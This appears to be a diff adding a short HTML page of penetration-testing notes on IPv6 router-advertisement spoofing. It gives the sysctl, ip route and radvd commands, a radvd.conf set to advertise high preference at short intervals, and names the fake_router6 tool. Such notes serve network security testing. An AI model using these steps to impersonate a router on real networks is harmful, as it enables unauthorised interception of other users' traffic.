@@ -1,0 +1,31 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Router Advertisements</title>
+</head><body>Nodes discover router presence with ICMPv6 Router Solicitation messages and routers respond with configuration details for all nodes. <br/>
+Attacker can claim to be a router with a higher preference. <br/>
+<br/>
+Usefull for attacking networks where other IPv6 routes exist and easy to attack with the built-in Linux IPv6 router daemon. <br/>
+<br/>
+Configure forwarding so clients are not DoSed<br/>
+# sysctl -w net.ipv6.conf.all.forwarding=1<br/>
+<br/>
+Configure the default route to the proper gateway<br/>
+# ip route add default via &lt;&gt; dev eth0<br/>
+<br/>
+Start the router daemon<br/>
+# radvd -c /etc/radvd.conf<br/>
+<br/>
+Example radvd.conf<br/>
+interface eth0 {<ul><li style="list-style-type: none">&nbsp; &nbsp; AdvSendAdvert on;&#09;&#09;&#09;#process should send advertisements</li>
+<li style="list-style-type: none">&nbsp; &nbsp; AdvDefaultPreference high;&#09;&#09;# highest advertised preference</li>
+<li style="list-style-type: none">&nbsp; &nbsp; MinRtrAdvInterval 3;&#09;&#09;&#09;# 3 second min between ads</li>
+<li style="list-style-type: none">&nbsp; &nbsp; MaxRtrAdvInterval 4;&#09;&#09;&#09;# 4 second max between ads</li>
+<li style="list-style-type: none">&nbsp; &nbsp; prefix &lt;&gt;/64 {&#09;&#09;&#09;&#09;# address space and prefix for clients</li>
+</ul>
+&nbsp; &nbsp; };<br/>
+};<br/>
+<br/>
+Another option is to use other tools such as:<br/>
+[fake_router6]() | tool for attacking IPv6 Router Impersonation</body></html>
